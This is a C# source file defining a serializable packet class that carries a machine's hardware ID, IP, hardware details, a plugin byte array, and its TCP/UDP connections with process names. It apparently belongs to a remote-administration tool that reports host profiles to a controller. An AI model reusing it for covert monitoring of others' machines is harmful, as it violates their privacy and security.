using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class InformationPacket : IPacket
    {
        public InformationPacket() : base()
        {
            this.packetType = PacketType.MISC_INFORMATION;
        }

        public InformationPacket(Dictionary<string, List<string>> hardwareInformation, List<TcpProcessRecord> tcpConnectionIPV4, List<UdpProcessRecord> udpConnectionIPV4, string baseIp, string HWID) : base()
        {
            this.packetType = PacketType.MISC_INFORMATION;
            this.baseIp = baseIp;
            this.HWID = HWID;

            this.hardwareInformation = hardwareInformation;
            this.tcpConnectionIPV4 = tcpConnectionIPV4;
            this.udpConnectionIPV4 = udpConnectionIPV4;
        }

        public string HWID { get; set; }
        public string baseIp { get; set; }
        public byte[] plugin { get; set; }
        public PacketType packetType { get; }
        public string status { get; set; }
        public string datePacketStatus { get; set; }

        public Dictionary<string, List<string>> hardwareInformation { get; set; }
        public List<TcpProcessRecord> tcpConnectionIPV4 { get; set; }
        public List<UdpProcessRecord> udpConnectionIPV4 { get; set; }

        [Serializable]
        [StructLayout(LayoutKind.Sequential)]
        public class TcpProcessRecord
        {
            public enum MibTcpState
            {
                CLOSED = 1,
                LISTENING,
                SYN_SENT,
                SYN_RCVD,
                ESTABLISHED,
                FIN_WAIT1,
                FIN_WAIT2,
                CLOSE_WAIT,
                CLOSING,
                LAST_ACK,
                TIME_WAIT,
                DELETE_TCB,
                NONE = 0
            }

            public IPAddress LocalAddress { get; set; }

            public ushort LocalPort { get; set; }

            public IPAddress RemoteAddress { get; set; }

            public ushort RemotePort { get; set; }

            public MibTcpState State { get; set; }

            public int ProcessId { get; set; }
            public string ProcessName { get; set; }

            public TcpProcessRecord(IPAddress localIp, IPAddress remoteIp, ushort localPort, ushort remotePort, int pId, MibTcpState state)
            {
                this.LocalAddress = localIp;
                this.RemoteAddress = remoteIp;
                this.LocalPort = localPort;
                this.RemotePort = remotePort;
                this.State = state;
                this.ProcessId = pId;
                bool flag = Process.GetProcesses().Any((Process process) => process.Id == pId);
                if (flag)
                {
                    this.ProcessName = Process.GetProcessById(this.ProcessId).ProcessName;
                }
            }
        }

        [Serializable]
        [StructLayout(LayoutKind.Sequential)]
        public class UdpProcessRecord
        {
            public IPAddress LocalAddress { get; set; }

            public uint LocalPort { get; set; }

            public int ProcessId { get; set; }

            public string ProcessName { get; set; }

            public UdpProcessRecord(IPAddress localAddress, uint localPort, int pId)
            {
                this.LocalAddress = localAddress;
                this.LocalPort = localPort;
                this.ProcessId = pId;
                bool flag = Process.GetProcesses().Any((Process process) => process.Id == pId);
                if (flag)
                {
                    this.ProcessName = Process.GetProcessById(this.ProcessId).ProcessName;
                }
            }
        }
    }
}
